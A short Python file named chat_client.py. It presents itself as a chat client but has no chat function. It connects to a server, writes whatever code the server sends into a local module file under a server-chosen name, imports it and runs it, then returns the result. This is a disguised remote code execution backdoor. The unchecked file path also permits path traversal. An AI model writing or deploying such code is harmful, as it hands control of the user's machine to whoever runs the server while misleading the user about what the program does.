# chat_client.py

import sys
import socket
import select
import importlib

DATA_LEN = 1024


def client(host, port):
    # if (len(sys.argv) < 3):
    #     print('Usage : python chat_client.py hostname port')
    #     sys.exit()
    #
    # host = sys.argv[1]
    # port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    # connect to remote host
    try:
        s.connect((host, port))
    except Exception as e:
        print(e)
        sys.exit()

    print('Connected to remote host. You can start sending messages')
    sys.stdout.write('> ')
    sys.stdout.flush()

    flag = True
    cmd = ''
    while 1:
        socket_list = [s]

        # Get the list sockets which are readable
        ready_to_read, ready_to_write, in_error = select.select(socket_list, [], [])

        for sock in ready_to_read:
            if sock == s:
                # incoming message from remote server
                if flag:
                    cmd = sock.recv(DATA_LEN).decode()
                    cmd = cmd.split(' ')
                    path = './module/' + cmd[0] + '.py'
                    flag = False
                    fin = open(path, 'w')
                    break

                data = sock.recv(DATA_LEN).decode()
                fin.write(data)
                fin.close()

                i = importlib.import_module('module.' + cmd[0])
                list_para = cmd[1:]
                ret = i.run(list_para)
                print('the result of run: %s\n' % ret)
                sock.sendall(str(ret).encode())
            # else:
            #     cmd_str = sys.stdin.readline()
            #     sys.stdout.write('> ')
            #     sys.stdout.flush()


if __name__ == "__main__":
    sys.exit(client("localhost", 9090))
